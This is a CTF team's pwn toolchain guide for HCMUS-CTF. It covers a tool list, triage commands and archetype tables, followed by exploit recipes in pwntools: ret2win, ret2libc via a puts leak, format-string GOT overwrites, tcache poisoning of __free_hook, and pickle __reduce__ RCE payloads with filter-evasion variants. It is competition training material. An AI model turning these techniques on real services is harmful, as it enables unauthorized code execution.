# Pwn - Toolchain

Research-backed (2026-05-23) by cross-referencing the [Gallopsled/pwntools docs
and source](https://github.com/Gallopsled/pwntools), the [pwndbg](https://github.com/pwndbg/pwndbg)
and [GEF](https://hugsy.github.io/gef/) communities, the
[CTF Cookbook pwn section](https://ctfcookbook.com/docs/pwn/), and
[Jorian Woltjer's Practical CTF book](https://book.jorianwoltjer.com/binary-exploitation/pwntools).
Then mapped against `HCMUS-CTF-PATTERNS.md` §3 and §4b pwn rows
(2023: string_chan, coin_mining, pickle_trouble, python_is_safe; 2025: CSES,
DragonBalls; J4F edition: www format-string).

The picture is consistent. Pwn workflow in 2026 is `pwntools` for scripting +
`pwndbg`-augmented `gdb` for debugging + a small set of static helpers
(`checksec`, `ROPgadget`, `one_gadget`). Heap exploitation is the only sub-area
that demands glibc-version-specific knowledge - tcache layout, hook removal,
and safe-linking changed across 2.32, 2.34, 2.35.

## Research framing - what this category looks like at HCMUS-CTF

Per `HCMUS-CTF-PATTERNS.md` §4b, the Pwn block expects roughly three challenges,
mid-heavy:

```
PWN  (~3 challenges, mid-heavy)
+-- Medium  classic BoF + libc leak       (CSES 2025, www J4F)
+-- Medium  Python jail / pickle / unsafe (pickle_trouble 2023,
            deserialization                python_is_safe 2023)
+-- Hard    UAF / fastbin / tcache        (DragonBalls 2025)
```

Three operational constraints shape the toolchain choice:

1. **rCTF 1-hour instance TTL** (`STRATEGY.md` "Challenge instance lifecycle").
   The container restarts every 60 minutes. Exploits MUST be replayable from
   scratch in a single `python solve.py` run. No "leak now, RCE in 30 min".
   No stashed heap state. The pwntools script IS the artifact.
2. **One solver, 45-minute timebox** (`STRATEGY.md` "Discipline rules"). Pwn
   gets two attempts max before mop-up. The toolchain must shrink the
   triage->working-exploit loop to under 15 minutes for the easy/mid tier.
3. **Untrusted binary -> sandbox required** (`CLAUDE.md` "Toolkit setup"). Every
   challenge binary runs inside the `ctf` distrobox/archlinux container. Host
   gets pwntools, pwndbg, gdb. Container gets the binary, its libc, and a
   matching loader.

## Tier 1 - must have, install before the qualifier

These five are non-negotiable. Without any one of them the medium-tier pwn
challenges become 2-3x slower.

| Tool | Why it's the consensus pick | Install |
|------|----------------------------|---------|
| **pwntools** | The CTF framework. `remote()`, `process()`, `ELF()`, `ROP()`, `cyclic()`, `fmtstr_payload()`, `gdb.attach()` - one library replaces five hand-rolled helpers. Best supported on Ubuntu LTS + Python 3.10+. | `pipx install pwntools` (use a venv; `pip install pwntools`). |
| **gdb + pwndbg** | The CTF-optimized GDB extension. Heap commands (`bins`, `heap`, `tcachebins`, `fastbins`), `vmmap`, `checksec`, `cyclic`, `telescope`. Pwndbg is the consensus choice for rapid CTF exploitation; GEF is the multi-arch alternative. | pwndbg: `git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh`. Verify `.gdbinit` contains the source line. |
| **ROPgadget** | The de facto gadget search tool. Supports ELF/PE/Mach-O across x86, x64, ARM, ARM64, PowerPC, SPARC, MIPS, RISC-V. Output filterable by string and pipeable into pwntools. | `pacman -S ropgadget` or `pipx install ROPgadget`. |
| **checksec** | One-liner triage: NX, PIE, RELRO, Canary, Fortify. First command run on every binary - it decides whether to write a ret2libc, a ROP chain, or a SROP. | `pacman -S checksec` or fall back to pwntools' `checksec ./binary` shim. |
| **one_gadget** | Single-call execve("/bin/sh", 0, 0) gadgets inside libc, with the register/stack constraints printed. The fastest path from "I have a libc leak" to "shell" when the constraints align. | `gem install one_gadget` (Ruby gem). |

Minimum viable pwn kit during the qualifier:
**pwntools + gdb-pwndbg + ROPgadget + checksec + one_gadget**, all installed on
the host. The challenge binary itself runs in the `ctf` distrobox.

## Tier 2 - load on demand when the archetype matches

| Tool | Trigger archetype |
|------|-------------------|
| **ropper** | Cross-check ROPgadget when a gadget search comes back empty. Different gadget extraction heuristics; ropper finds some that ROPgadget misses (and vice versa). |
| **libc-database** | Fingerprint a remote libc from 1-2 leaked symbol bytes. `./find puts 5f0 printf 7a0` -> exact libc -> exact offsets. Critical when the challenge ships no libc. |
| **pwninit** | One-shot setup for downloaded challenge bundles: pulls matching libc, patches the binary RPATH/interp, makes the binary runnable locally with the right libc. Saves 5-10 minutes of `patchelf` per challenge. |
| **GEF** | Multi-arch alternative to pwndbg (ARM, MIPS). Switch to GEF if the binary is non-x86 - pwndbg is x86-centric. Both can coexist; pick at `.gdbinit` runtime. |
| **angr** | Symbolic execution. Last resort for crackmes embedded in the pwn binary (input check that gates the vulnerable code path). Not for the exploit itself - too slow. |
| **AFL / AFL++** | Coverage-guided fuzzing. Use only when the bug location is non-obvious in a large binary. Almost never the right tool inside a 45-minute timebox; mention here for completeness. |
| **seccomp-tools** | Dump a binary's seccomp filter (`seccomp-tools dump ./binary`). Required when the challenge blocks `execve` and forces an ORW (open/read/write) ROP chain - see DragonBalls 2025 archetype. |
| **ltrace / strace** | Trace library / syscall activity to understand what a stripped binary actually does before reversing it. Cheap reconnaissance before opening Ghidra. |
| **patchelf** | Swap the binary's loader + libc so it runs against the challenge's libc locally. Pwninit wraps this; raw patchelf for when pwninit's heuristics fail. |
| **fictl / pickletools** | Inspect / hand-craft pickle opcodes for the pickle_trouble / unsafe-deserialization archetype. `python -m pickletools file.pkl` disassembles. |
| **Ghidra (NSA) / IDA Free** | Decompile when source isn't provided. Pwn challenges sometimes ship only a stripped binary; decompilation accelerates bug discovery vs raw `objdump -d`. |

## Mapping back to HCMUS-CTF archetypes

Cross-referenced with `HCMUS-CTF-PATTERNS.md` §4b and the practice material
under `practice/2023-archive/.../pwn/` and `writeups/www/`.

| Archetype | Primary tool chain | Backup |
|-----------|--------------------|--------|
| Triage any binary | `file`, `checksec`, `ldd`, `strings \| grep GCC`, `strings \| grep -i libc`, `objdump -R` for imports | pwntools `ELF()` for symbol enum |
| Stripped binary -> recover function names | Ghidra Function ID (libc fidb for the target distro) | r2 `aaa` + dynamic-reloc cross-match; BinDiff against libc-database libc as last resort |
| Find buffer-overflow offset | pwntools `cyclic(N)` + `cyclic_find(crash_rip)` | hand-craft pattern |
| Ret2win (win/give_flag symbol present, Triển Vọng easy tier) | pwntools `ROP(elf).call('win', [args])` + stack-align ret gadget | hand-rolled `p64(ret) + p64(win)` payload |
| Classic BoF + libc leak (CSES 2025, www J4F) | pwntools `ROP(elf)` chain leak via `puts(puts@got)` -> recv -> compute libc base -> second-stage ret2libc | hand-rolled `p64()` payload + `recvline()` |
| Leak-target selection (no `puts` imported) | `objdump -R ./chall` -> intersect imports with reachable-before-bug functions; use `printf("%s",x)` / `write(1,x,8)` instead of `puts` | format-string `%N$s` for arbitrary read |
| Format-string read (J4F www) | pwntools `%N$p` stack-leak loop to find libc + stack canary | pwndbg `fmtarg`/`fmtstr-helper` |
| Format-string write (J4F www, `printf(name)`) | pwntools `fmtstr_payload(offset, {addr: value})` | hand-craft `%Nc%hhn` chain |
| Identify remote libc from a leak | libc-database `./find sym1 lsb1 sym2 lsb2` | manual: check Ubuntu/Debian releases against leak |
| Ret2libc once libc base is known | `libc.sym.system` + `next(libc.search(b"/bin/sh"))` -> ROP | one_gadget if constraints align |
| One-shot libc shell | one_gadget on the matched libc, verify constraints in pwndbg | full ret2libc ROP |
| ROP gadget hunting | `ROPgadget --binary ./chall \| grep "pop rdi"` | ropper |
| Heap UAF / fastbin / tcache (DragonBalls 2025) | pwndbg `heap`, `bins`, `tcachebins` to inspect state per malloc/free | manual `vmmap` + `x/...` |
| libc 2.32+ safe-linking unmask | demangle: `ptr = (mangled >> 12) ^ mangled` | pwndbg's tcache view does this automatically |
| Tcache poisoning (libc 2.31-2.34) | overwrite next pointer, redirect malloc -> target, write one_gadget at __free_hook / __malloc_hook | direct house-of-something pattern |
| Tcache + hook removal (libc 2.34+) | hooks gone in 2.34. Pivot to FILE-stream exploitation (`_IO_FILE_plus` write/read overlap, `_IO_obstack_jumps`) or House of Apple | seccomp-aware ORW ROP chain |
| Python jail (python_is_safe 2023) | inspect imports, look for ctypes/eval/exec residue; the practice binary leaks via `gets(buf1)` then checks `buf2` for `HCMUS-CTF` - classic adjacent-buffer overflow into the C string | hand-trace with `python -i` |
| Pickle deserialization (pickle_trouble 2023) | craft a class with `__reduce__` returning (callable, args) -> `pd.read_pickle()` triggers RCE. `pickletools.dis()` to verify opcodes pass any pre-filter | raw opcode stream `c__builtin__\neval\n(S'...'\ntR.` |
| Sandbox / seccomp ORW chain | seccomp-tools to confirm forbidden syscalls -> ROP chain `open("flag",0); read(3, buf, 0x100); write(1, buf, 0x100)` | shellcraft for raw shellcode if NX off |
| Stripped binary -> bug location | Ghidra decompile + `objdump -d -M intel \| less` | radare2 `aaa; pdf` |
| Replay-from-scratch (rCTF 1h TTL) | one pwntools script, parameterized `local=True` for process, `local=False` for remote | n/a - non-negotiable |

## Workflow

Three phases, each with a hard timebox aligned to `STRATEGY.md`'s 45-min rule.

### Phase 1 - Triage (5 minutes)

Goal: classify the challenge into one of the five archetypes (ret2win, BoF+leak,
format string, heap, pickle/jail), pick the leak target, and decide whether to
attack now or skip. Phase 1 is the RE step; Phase 2 turns its output into code.

```
$ cd ctf-workdir/<challenge>/
$ file ./chall                       # ELF type, dynamically linked, stripped?
$ checksec ./chall                   # NX, PIE, RELRO, Canary?
$ ldd ./chall                        # required libc version
$ strings ./chall | grep GCC         # Ubuntu version hint (e.g. Ubuntu 22.04 -> libc 2.35)
$ strings ./chall | head -50         # any obvious format-string fmt, system, /bin/sh?
$ nm -D ./chall 2>/dev/null | grep -i 'win\|flag\|system\|gets'  # backdoors / ret2win?
$ objdump -R ./chall                 # dynamic relocations = imported libc symbols
$ readelf --dyn-syms ./chall         # alternate view; useful when objdump -R is empty
```

Pwntools-side triage:

```python
from pwn import *
elf = ELF('./chall')
print(elf.checksec())
print('GOT:', {k: hex(v) for k, v in elf.got.items()})
print('PLT:', {k: hex(v) for k, v in elf.plt.items()})
print('SYMS:', [s for s in elf.symbols if 'win' in s.lower() or 'flag' in s.lower()])
```

**Step 1a - checksec decision tree.** What the mitigations let you do, and
what they force you to leak first:

| `checksec` output | Attack class | What you still need |
|-------------------|--------------|---------------------|
| NX off, no canary, no PIE | Shellcode-on-stack (rare in 2026) | Just the EIP/RIP offset |
| NX on, no canary, no PIE | Static ret2libc / ROP via fixed `.got` / `.plt` | If libc unknown: a libc fingerprint leak |
| NX on, no canary, PIE | ROP, but need a code-base leak first | One PIE leak (return-address leak, format string `%p`, libc leak that infers code base) |
| NX on, canary, no PIE | Leak canary, then ROP | Canary leak (format string `%N$p`, read-past-canary, fork-with-canary-stable) |
| NX on, canary, PIE, Full RELRO | The hard tier: leak canary, leak PIE, leak libc, then ROP - no GOT overwrite possible | Three leaks before any control flow change |

`No RELRO` / `Partial RELRO` enables GOT overwrite (format-string write target).
`Full RELRO` means GOT is read-only; pivot to a writeable target (libc hook in
pre-2.34, FILE-stream vtable in 2.34+, return address on stack).

**Step 1b - stripped binary? recover function names first.** A stripped binary
in Ghidra/IDA shows `FUN_0040123a` everywhere; bug-hunting in that view eats 30
minutes you do not have. Recovery flow:

```
1. Ghidra File -> Analyze -> select "Function ID" + "ELF Scalar Operand References"
2. Window -> Function ID -> Apply -> select the libc.fidb matching the target
   distro (Ubuntu 22.04 -> libc 2.35 fidb). Ghidra's stock fidbs cover libc 2.27
   through 2.38; download more from NationalSecurityAgency/ghidra-data if needed.
3. In r2: `aaa` then `is~puts,printf,read,gets,malloc,free` - r2 cross-checks
   dynamic relocations against function bodies and renames automatically.
4. As a last resort, BinDiff against the matching libc.so.6 from libc-database -
   matches stripped functions to libc by structural similarity.
```

After recovery the decompiler shows `read`, `printf`, `malloc` by name, and the
user-controlled function becomes obvious as "the one that is not a libc wrapper".

**Step 1c - leak-target selection (BoF/ROP archetype only).** `puts@got` is the
textbook leak target only if `puts` is actually imported. Read the rule directly:

```
leak target = (imported libc symbols) intersect (functions reachable BEFORE the
                                                 vulnerable site, or callable
                                                 via PLT from a ROP gadget)
```

If `objdump -R ./chall` shows `puts`, use it (shortest payload). If only
`printf` is imported, use `printf("%s\n", printf@got)`. If only `write` is
imported, use `write(1, write@got, 8)`. If only `read` is imported, the binary
has no output side - look for a different leak primitive (format string,
unsorted-bin libc residual, or `__stack_chk_fail`'s libc string).

**Step 1d - static-review checklist before writing one line of pwntools.**
Open the decompile (Ghidra) and look for, in order:

1. **Win functions** - `win`, `give_flag`, `print_flag`, `cat_flag`, any
   function that reads `flag.txt` or `execve("/bin/sh", ...)`. If one exists,
   ret2win (Recipe 0) is the entire challenge.
2. **Unbounded reads** - `gets(buf)`, `read(0, buf, ATTACKER_SIZE)`,
   `scanf("%s", buf)`, `strcpy(dst, src)` where `src` is user input. Any of
   these gives a clean BoF offset.
3. **Format-string sinks** - `printf(user_buf)` where `user_buf` is not in
   the format-arg slot. Distinct from `printf("%s", user_buf)` which is safe.
4. **Heap menu handlers** - `add` / `delete` / `edit` / `show`. The buggy one
   usually has fewer bounds checks or skips `arr[i] = NULL` after `free` (UAF).
   Diff them side by side; the one that does less is the bug.
5. **Custom VM / interpreter / sandbox** - opcode dispatch table, a `switch`
   on user bytes that calls handlers. Time-sink; skip unless 6h+ remain.

Decision table after triage:

| Indicator | Likely archetype | Skip? |
|-----------|------------------|-------|
| `win`/`give_flag`/`/bin/sh` string + simple `gets`/`read` overflow | Ret2win (easy) | No - 15 min |
| No canary, NX on, no PIE, `gets`/`read(0,buf,0x100)` in disasm | BoF + ret2libc (mid) | No - 30 min |
| No canary, PIE on, format string in `printf(user_input)` | Format string (mid) | No - 30 min |
| `malloc`/`free` menu with edit/show, libc 2.31-2.34 | Heap UAF/tcache (hard) | Maybe - 45 min only |
| `malloc`/`free` menu, libc 2.35+ | Heap with FILE-stream pivot (hard) | Yes unless top-10 contested |
| `pickle.load` or `pd.read_pickle` in server source | Pickle RCE (mid) | No - 15 min |
| `eval`/`exec`/`compile` in server source | Python jail (mid) | No - 20-30 min |
| Custom VM bytecode interpreter | Hard, time sink | Yes unless 6h+ remain |

### Phase 2 - Exploit (one recipe per archetype)

All exploits live in a single `solve.py`. The skeleton:

```python
#!/usr/bin/env python3
from pwn import *

exe = './chall'
context.binary = elf = ELF(exe)
context.log_level = 'info'    # 'debug' if stuck

if args.REMOTE:
    p = remote('chall.blackpinker.com', 12345)
    libc = ELF('./libc.so.6')          # provided or pulled via libc-database
else:
    p = process(exe)
    libc = elf.libc

if args.GDB:
    gdb.attach(p, '''
        b *main+123
        c
    ''')
```

#### Recipe 0: ret2win (Triển Vọng easy tier)

The most common easy-pwn shape and the bracket-winning one per
`HCMUS-CTF-PATTERNS.md` §6. Indicators from Phase 1: `nm -D ./chall` shows a
`win` / `give_flag` / `print_flag` symbol, or the decompile contains a
function that `open("flag.txt")` / `system("/bin/sh")`. Recipe:

```python
# 1. Find offset (one-shot with cyclic):
# p.sendline(cyclic(200)); p.wait(); core=p.corefile
# print(cyclic_find(core.read(core.rsp, 8)))
offset = 40
win = elf.symbols['win']         # or hardcode the address from `nm -D`

# 2. Pivot: most x64 win() functions need a 16-byte stack alignment
#    fix (movaps inside system() will SIGSEGV if rsp%16 != 0).
ret = next(elf.search(asm('ret'), executable=True))   # any single-ret gadget
payload = b'A'*offset + p64(ret) + p64(win)
p.sendlineafter(b'>', payload)
p.interactive()
```

If the win function takes arguments (e.g. `win(0xdeadbeef, 0xcafebabe)`),
chain a `pop rdi; ret` and `pop rsi; pop r15; ret` from ROPgadget:

```python
rop = ROP(elf)
rop.call('win', [0xdeadbeef, 0xcafebabe])
p.sendlineafter(b'>', b'A'*offset + rop.chain())
```

If checksec shows a stack canary, ret2win still works - but you must leak the
canary first (format string, fork-stable canary brute, or read-past-canary
without overwriting it). Skip ret2win and route to Recipe A if canary is on
and no leak is available.

#### Recipe A: classic BoF + libc leak (CSES 2025, www J4F)

```python
# 1. Find offset
# (run once with cyclic to confirm; hardcode after)
# p.sendline(cyclic(200)); p.wait(); core=p.corefile; print(cyclic_find(core.read(core.rsp, 8)))
offset = 72

# 2. Leak puts via puts@plt(puts@got)
rop = ROP(elf)
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])      # return to main for second stage

p.sendlineafter(b'name?', b'A'*offset + rop.chain())
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.info('libc base = ' + hex(libc.address))

# 3. Ret2libc: system('/bin/sh')
rop2 = ROP(libc)
rop2.call('system', [next(libc.search(b'/bin/sh\x00'))])
p.sendlineafter(b'name?', b'A'*offset + rop2.chain())
p.interactive()
```

If the binary swallows `\n` (e.g. `read` with limited length), drop the `main`
return and use a `one_gadget`:

```python
og = libc.address + 0xebcf1   # output of `one_gadget ./libc.so.6` after constraint check
p.sendlineafter(b'name?', b'A'*offset + p64(libc.address + RET_GADGET) + p64(og))
```

**Verify one_gadget constraints in pwndbg before trusting them.** `one_gadget`
prints lines like `constraints: rsp & 0xf == 0 && rcx == NULL`. Beginners pick
the first gadget, get SIGSEGV, and give up. Don't:

```
$ one_gadget ./libc.so.6        # outputs e.g. 0xebcf1, 0xebcf5, 0xebcf8
# In the pwntools script, set args.GDB=1 to attach pwndbg, then:
#   pwndbg> b *<libc_base + gadget_offset>
#   pwndbg> c
#   pwndbg> info reg rsp rcx rdx r8 r9   # check the constraint
#   pwndbg> p ((long)$rsp) & 0xf         # alignment check
# If a constraint fails, try the next gadget in the list. There are usually
# 3-5 gadgets per libc; one of them works.
```

#### Recipe B: format-string write (www J4F)

`writeups/www/solve.py` is the canonical reference - studied, condensed:

```python
# Stage 1: overwrite a GOT entry that the program calls in a loop with main()
# so we get multiple format-string opportunities
payload = b'%5231c%12$hnaaaa' + p64(elf.got['putchar'])
p.sendlineafter(b'name?', payload)
p.send(b'b')  # trigger the loop

# Stage 2: leak libc via %p at offset 12 (printf calling convention puts
# _IO_2_1_stdin_ in rdi -> formatted as the first stack arg in x64)
p.sendlineafter(b'name?', b'%p')
libc_base = int(p.recvline(), 16) - libc.sym._IO_2_1_stdin_ - 131

# Stage 3: write low 2 bytes of system over printf's GOT entry
# (printf and system share the same byte 0; 2-byte write fits the 26-char limit)
system_low2 = ((libc.sym.system + libc_base) & 0xffff00) >> 8
payload = b'%' + str(system_low2).encode() + b'c%12$hn'
payload += b'a' * (16 - len(payload))
payload += p64(elf.got['printf'] + 1)
p.sendlineafter(b'name?', payload)

# Stage 4: input becomes the argument to system()
p.sendline(b'/bin/sh\x00')
p.interactive()
```

When the write is unconstrained, use pwntools' `fmtstr_payload` directly:

```python
payload = fmtstr_payload(offset, {elf.got['printf']: libc.sym.system}, write_size='short')
p.sendline(payload)
```

#### Recipe C: heap UAF / tcache (DragonBalls 2025)

Before exploiting, identify the bug from the menu handlers. Open the
decompile and diff `add` / `delete` / `edit` / `show` side by side - the
buggy one is the one that does less. Common tells, in order of frequency:

- `delete` does `free(arr[i])` but does NOT set `arr[i] = NULL` -> UAF; the
  freed pointer is still in the array and `show`/`edit` work on it.
- `add` writes `sz` bytes into a chunk allocated for `sz-1` (off-by-one).
- `edit` reads `N` bytes where `N > sz` of the original chunk -> heap overflow.
- `show` prints raw chunk contents without zeroing -> leaks heap/libc pointers
  from unsorted-bin or tcache leftovers.

The recipe below assumes UAF (the most common DragonBalls-style bug).

```python
# Menu helpers - adapt to the challenge's prompts
def add(i, sz, data):
    p.sendlineafter(b'>', b'1'); p.sendlineafter(b'idx', str(i).encode())
    p.sendlineafter(b'size', str(sz).encode()); p.sendlineafter(b'data', data)
def free(i):
    p.sendlineafter(b'>', b'2'); p.sendlineafter(b'idx', str(i).encode())
def show(i):
    p.sendlineafter(b'>', b'3'); p.sendlineafter(b'idx', str(i).encode())
    return p.recvline().strip()
def edit(i, data):
    p.sendlineafter(b'>', b'4'); p.sendlineafter(b'idx', str(i).encode())
    p.sendlineafter(b'data', data)

# 1. libc leak via unsorted-bin leftover or tcache_perthread_struct
add(0, 0x420, b'A')          # large enough to land in unsorted bin
add(1, 0x20, b'B')           # guard
free(0)
leak = u64(show(0).ljust(8, b'\x00'))
libc.address = leak - 0x1ecbe0    # libc-specific unsorted-bin offset; verify in pwndbg

# 2. UAF + tcache poison (libc 2.31-2.33)
add(2, 0x40, b'C'); add(3, 0x40, b'D')
free(2); free(3)
edit(3, p64(libc.sym.__free_hook))     # 2.33-: hook still usable
add(4, 0x40, b'/bin/sh\x00')           # next malloc returns __free_hook
add(5, 0x40, p64(libc.sym.system))     # write system into __free_hook
free(4)                                # triggers free(__free_hook) = system("/bin/sh")
p.interactive()
```

For libc 2.34+ where hooks are gone, swap step 2-3 for a FILE-stream
overwrite (`_IO_2_1_stdout_` -> `vtable` -> House of Apple 2). This is the
"hard" tier and routinely eats 4+ hours - skip unless top-10 contested.

#### Recipe D: pickle deserialization (pickle_trouble 2023)

```python
import pickle, base64

class RCE:
    def __reduce__(self):
        return (eval, ("__import__('os').popen('cat flag.txt').read()",))

payload = pickle.dumps(RCE())
# pickle_trouble specifically wants the payload framed as a DataFrame
# (pd.read_pickle accepts plain pickle too)
p.sendlineafter(b'size', str(len(payload)).encode())
p.sendlineafter(b'frame', payload)
print(p.recvall(timeout=3))
```

If the server filters obvious names (`os`, `subprocess`):

```python
class RCE:
    def __reduce__(self):
        return (getattr(__import__('builtins'), 'eval'),
                ("getattr(__import__('o'+'s'),'system')('id')",))
```

Verify with `pickletools.dis(payload)` before sending - the opcode list shows
exactly what classes / globals will be resolved on the server side.

#### Recipe E: Python jail / adjacent-buffer leak (python_is_safe 2023)

```python
# main.py:
#   buf1 = c_buffer(512); buf2 = c_buffer(512)
#   libc.gets(buf1)
#   if b'HCMUS-CTF' in bytes(buf2): print(open('flag.txt').read())
#
# c_buffer allocates contiguously; `gets` (no length) overflows buf1 into buf2.
# Send 512 bytes of padding + the flag-prefix substring -> ctypes finds it in buf2.

payload = b'A' * 512 + b'HCMUS-CTF'
p.sendline(payload)
print(p.recvall(timeout=3))
```

The general rule for "Python sandbox" challenges: read the source first. The
bug is usually in an unsafe FFI call (`ctypes`), an `eval(input())`, or a
`pickle.load`. Pure Python sandbox escapes via subclass tree
(`().__class__.__base__.__subclasses__()`) are common in pyjails but rare in
HCMUS-CTF specifically.

### Phase 3 - Validate (5 minutes)

Per `STRATEGY.md` "Challenge instance lifecycle":

1. Run `python solve.py` against `local=True` (process). It must print the
   local flag placeholder or pop a working shell.
2. Restart from scratch: `pkill -f solve.py`; rerun. If it works only once
   (e.g. relies on a cached libc leak), fix it - the rCTF instance restarts
   the same way.
3. Run against the remote instance: `python solve.py REMOTE`. Sleep 2 seconds
   before the first send if the instancer is slow to bind.
4. Submit the flag from the solver browser profile only (`STRATEGY.md` "Login
   policy"). Ops doesn't double-submit.
5. If the remote returns a different layout than local (different libc, ASLR
   off vs on), pull the remote libc with `libc-database` or `pwninit`, rebuild
   offsets, re-run.

If the exploit fails twice on remote, mark the challenge `[stuck]` and move
on. Return in the mop-up window.

## Sources

- [Gallopsled/pwntools (GitHub)](https://github.com/Gallopsled/pwntools)
- [pwntools on PyPI](https://pypi.org/project/pwntools/)
- [pwnlib.fmtstr documentation - format string exploitation](https://docs.pwntools.com/en/stable/fmtstr.html)
- [PwnTools chapter - Practical CTF (Jorian Woltjer)](https://book.jorianwoltjer.com/binary-exploitation/pwntools)
- [pwndbg (GitHub)](https://github.com/pwndbg/pwndbg)
- [GEF - GDB Enhanced Features](https://hugsy.github.io/gef/)
- [PEDA, GEF, and PWNDBG - which GDB extension in 2025? (Medium / elpe_pinillo)](https://medium.com/@elpepinillo/peda-gef-and-pwndbg-which-gdb-extension-should-you-use-in-2025-67033ddd8459)
- [Exploiting with pwndbg - PlaidCTF 2016 SmartStove (XPN InfoSec)](https://blog.xpnsec.com/pwndbg/)
- [ROPgadget (GitHub)](https://github.com/JonathanSalwan/ROPgadget)
- [Gadget hunting with ropper, ROPgadget, and one_gadget (nyxFault)](https://nyxfault.github.io/posts/ROP-tools/)
- [Return Oriented Programming - CTF Handbook (ctf101)](https://ctf101.org/binary-exploitation/return-oriented-programming/)
- [Glibc 2.31 Heap + Seccomp Exploitation using ROP (Midas's Blog)](https://lkmidas.github.io/posts/20210103-heap-seccomp-rop/)
- [CSR20 HowToHeap - Libc 2.32 writeup (Fascinating Confusion)](https://fascinating-confusion.io/posts/2020/11/csr20-howtoheap-writeup/index.html)
- [CTF Cookbook - pwn section](https://ctfcookbook.com/docs/pwn/)
- [Python Pickle Exploitation - CTF Support](https://ctf.support/web/python/pickle/)
- [Exploiting Python pickles (David Hamann)](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
- [Python Serialization Vulnerabilities - Pickle (HackingArticles)](https://www.hackingarticles.in/python-serialization-vulnerabilities-pickle/)
- [Python chapter - Practical CTF (Jorian Woltjer)](https://book.jorianwoltjer.com/languages/python)
- [Tut05: Format String Vulnerability - CS6265 Information Security Lab](https://tc.gts3.org/cs6265/2019/tut/tut05-fmtstr.html)
- [Format String Exploits - pwn.college](https://pwn.college/software-exploitation/format-string-exploits)
- [apsdehal/awesome-ctf curated tool list](https://github.com/apsdehal/awesome-ctf)
